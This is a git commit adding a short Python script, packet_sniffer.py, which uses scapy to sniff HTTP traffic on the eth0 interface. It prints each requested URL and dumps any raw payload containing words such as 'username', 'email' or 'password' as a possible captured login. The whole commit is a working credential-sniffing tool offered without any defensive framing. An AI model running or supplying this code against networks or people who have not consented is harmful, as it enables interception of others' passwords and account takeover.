d0e049dba6ce795ab90e9cca1192182b275566bf
Kevin <kevin.jully@free.fr>
2018-12-26 01:44:13 -0500

    sniffing http packets using scapy

---
+++ packet_sniffer/packet_sniffer.py
@@ -0,0 +1,33 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+from scapy.layers import http
+
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "login", "email", "pass", "user", "password"]
+        for word in keywords:
+            if word in load:
+                return load
+
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        print("[+] HTTP request >> " + get_url(packet))
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/passerword >> " + login_info)
+
+
+sniff("eth0")
